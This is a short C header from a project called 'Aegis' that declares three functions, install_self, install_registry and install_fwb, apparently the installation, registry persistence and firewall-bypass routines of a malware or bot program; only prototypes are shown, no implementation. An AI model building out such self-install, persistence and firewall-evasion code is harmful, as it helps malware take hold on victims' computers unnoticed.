/**
 * Aegis
 * Copyright ©2008 Loki - All Rights Reserved
 **/

#pragma once

#include "info.h"

void install_self    ( char* FileName, char* InstallName, BOOL Admin, ver_t Version );
void install_registry( char* Path,     char* Name,        BOOL Admin, ver_t Version );
void install_fwb     ( char* Path,     char* Name                                   );